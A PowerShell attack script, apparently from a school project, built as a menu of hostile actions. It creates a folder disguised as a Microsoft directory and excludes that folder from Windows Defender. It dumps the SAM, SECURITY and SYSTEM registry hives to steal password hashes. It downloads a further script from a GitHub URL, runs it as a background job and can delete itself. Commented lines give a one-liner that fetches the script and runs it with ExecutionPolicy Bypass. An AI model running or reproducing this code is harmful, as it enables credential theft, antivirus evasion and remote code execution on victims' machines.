$message = @"
    CHOOSE ACTIONS:
    0 - Exit and self-destruct
    1 - Export hashes
    2 - Upload hashes
    3 - Clean up
    4 - PC(not in)Control
"@;

$privBack = (whoami /priv | findstr "Backup"); # Read privilege to all files
$privRest = (whoami /priv | findstr "Restore"); # Write privilege to all files
$privOwn = (whoami /priv | findstr "Ownership"); # chmod privileges to all files

if(($privBack -eq $null) -or ($privRest -eq $null) -or ($privOwn -eq $null)) # Check privileges
{
    echo "NOT ENOUGH PRIVILEGES"
    Exit;
}
else # Create sandbox folder
{
    md "C:\Program Files\Common Files\Microsoft";
    icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F;
    Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Microsoft';
}

function choose() # Switch function
{
    echo $message

    $choice = Read-Host -Prompt "Your choice";

    Switch($choice)
    {
        0 {destruct;}
        1 {exportHashes;}
        2 {Exit;}
        3 {cleanUp;}
        4 {pcControl;}
    }
}

function destruct() # 0 - Exit and self-destruct
{
    rm -fo ".\run.ps1";
    Exit;
}

function exportHashes() # 1 - Export hashes
{
    reg.exe save hklm\sam "C:\Program Files\Common Files\Microsoft\sam.save";
    reg.exe save hklm\security "C:\Program Files\Common Files\Microsoft\security.save";
    reg.exe save hklm\system "C:\Program Files\Common Files\Microsoft\system.save";
    choose;
}

function cleanUp() # 3 - Clean up
{
    rm -r -fo "C:\Program Files\Common Files\Microsoft"
    choose;
}

function pcControl() # 4 - PC(not in)Control
{
    wget https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/NoPcControl.ps1 -outfile "C:\Program Files\Common Files\Microsoft\NoPcControl.ps1";
    #powershell.exe -windowstyle hidden -file "C:\Program Files\Common Files\Microsoft\NoPcControl.ps1";
    Start-Job -FilePath "C:\Program Files\Common Files\Microsoft\NoPcControl.ps1";
    choose;
}

choose;

#powershell -ExecutionPolicy Bypass -File .\run.ps1
#powershell wget https://raw.githubusercontent.com/sJ3Wpid/schoolproject/main/run.ps1 -outfile run.ps1; powershell -ExecutionPolicy Bypass -File .\run.ps1
